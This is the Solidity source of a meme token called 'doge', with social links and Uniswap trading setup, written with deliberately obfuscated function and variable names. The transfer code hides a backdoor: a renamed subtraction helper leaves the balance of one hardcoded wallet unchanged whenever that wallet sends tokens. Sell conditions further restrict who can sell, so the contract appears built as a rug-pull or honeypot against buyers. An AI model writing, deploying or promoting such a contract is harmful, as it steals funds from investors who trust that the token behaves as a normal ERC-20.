/**

Twitter: https://twitter.com/dogeerc_coin

Telegram: https://t.me/dogeerc_coin

Website: https://dogeerc.com/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _vkiw(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _vkiw(a, b, "SafeMath");
    }

    function  _vkiw(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _bvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract doge is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _jqouzr;
    address payable private _fosek;
    address private _rkfelp;
    string private constant _name = unicode"doge";
    string private constant _symbol = unicode"doge";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Kieox=0;
    uint256 private _qoecjy=0;
    uint256 public _becwen = _totalSupply;
    uint256 public _drorok = _totalSupply;
    uint256 public _kldlkv= _totalSupply;
    uint256 public _zbovaf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vhkrf;
    mapping (address => bool) private _vidqoy;
    mapping(address => uint256) private _fabiax;

    bool private _bkxuve;
    bool public _pdouoq = false;
    bool private deqhzh = false;
    bool private _peojpe = false;


    event _jveqbh(uint _becwen);
    modifier fojkrb {
        deqhzh = true;
        _;
        deqhzh = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _vhkrf[owner(

        )] = true;
        _vhkrf[address
        (this)] = true;
        _vhkrf[
            _fosek] = true;
        _fosek = 
        payable (0xEc46bb28bA70A093777CF9359E58F5F11B71305F);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _vkiw(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 pnfspg=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_pdouoq) {
                if (to 
                != address
                (_jqouzr) 
                && to !=
                 address
                 (_rkfelp)) {
                  require(_fabiax
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fabiax
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rkfelp && to != 
            address(_jqouzr) &&
             !_vhkrf[to] ) {
                require(amount 
                <= _becwen,
                 "Exceeds the _becwen.");
                require(balanceOf
                (to) + amount
                 <= _drorok,
                  "Exceeds the _drorok.");
                if(_qoecjy
                < _Kieox){
                  require
                  (! _ruknj(to));
                }
                _qoecjy++;
                 _vidqoy
                 [to]=true;
                pnfspg = amount._bvr
                ((_qoecjy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rkfelp &&
             from!= address(this) 
            && !_vhkrf[from] ){
                require(amount <= 
                _becwen && 
                balanceOf(_fosek)
                <_zbovaf,
                 "Exceeds the _becwen.");
                pnfspg = amount._bvr((_qoecjy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_qoecjy>
                _Kieox &&
                 _vidqoy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!deqhzh 
            && to == _rkfelp &&
             _peojpe &&
             contractTokenBalance>
             _kldlkv 
            && _qoecjy>
            _Kieox&&
             !_vhkrf[to]&&
              !_vhkrf[from]
            ) {
                _transferFrom( _iapab(amount, 
                _iapab(contractTokenBalance,
                _zbovaf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prkvuh(address
                    (this).balance);
                }
            }
        }

        if(pnfspg>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(pnfspg);
          emit
           Transfer(from,
           address
           (this),pnfspg);
        }
        _balances[from
        ]= _vkiw(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _vkiw(pnfspg));
        emit Transfer
        (from, to, 
        amount.
         _vkiw(pnfspg));
    }

    function _transferFrom(uint256
     tokenAmount) private
      fojkrb {
        if(tokenAmount==
        0){return;}
        if(!_bkxuve)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _jqouzr.WETH();
        _approve(address(this),
         address(
             _jqouzr), 
             tokenAmount);
        _jqouzr.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _iapab
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _vkiw(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _fosek){
            return a ;
        }else{
            return a .
             _vkiw (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _becwen = _totalSupply;
        _drorok = _totalSupply;
        emit _jveqbh(_totalSupply);
    }

    function _ruknj(address 
    account) private view 
    returns (bool) {
        uint256 evdwvp;
        assembly {
            evdwvp :=
             extcodesize
             (account)
        }
        return evdwvp > 
        0;
    }

    function _prkvuh(uint256
    amount) private {
        _fosek.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bkxuve ) ;
        _jqouzr  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _jqouzr), 
            _totalSupply);
        _rkfelp = 
        IUniswapV2Factory(_jqouzr.
        factory( ) 
        ). createPair (
            address(this
            ),  _jqouzr .
             WETH ( ) );
        _jqouzr.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rkfelp).
        approve(address(_jqouzr), 
        type(uint)
        .max);
        _peojpe = true;
        _bkxuve = true;
    }

    receive() external payable {}
}